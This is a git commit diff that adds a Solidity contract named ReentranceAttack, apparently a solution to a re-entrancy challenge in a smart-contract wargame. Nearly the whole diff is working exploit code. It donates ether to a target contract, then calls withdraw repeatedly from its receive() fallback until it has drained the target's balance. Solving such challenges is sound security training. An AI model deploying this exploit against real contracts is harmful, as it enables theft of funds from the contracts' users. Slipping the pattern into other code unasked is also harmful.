ce659f98762d7eeb4f371f34b02bdc7fd4bd4fb7
CharlesChinedum <charleschinedum2@gmail.com>
2026-04-21 08:22:27 +0100

    feat: implement re-entrancy attack logic for Reentrance contract

--- src/challenge-10-re-entrancy/ReentranceAttack.sol
+++ src/challenge-10-re-entrancy/ReentranceAttack.sol
@@ -1,6 +1,41 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.12;
+pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/math/SafeMath.sol";
+interface IReentrance {
+    function withdraw(uint256 _amount) external;
 
-contract ReentranceAttack {}
+    function donate(address _to) external payable;
+}
+
+contract ReentranceAttack {
+    IReentrance public target;
+    uint256 public attackAmount;
+
+    constructor(address _address) {
+        target = IReentrance(_address);
+    }
+
+    function attack() public payable {
+        attackAmount = msg.value;
+
+        target.donate{value: attackAmount}(address(this));
+
+        target.withdraw(attackAmount);
+    }
+
+    receive() external payable {
+        if (address(target).balance >= attackAmount) {
+            target.withdraw(attackAmount);
+        } else {
+            target.withdraw(address(target).balance);
+        }
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+
+    function getTargetBalance() public view returns (uint256) {
+        return address(target).balance;
+    }
+}
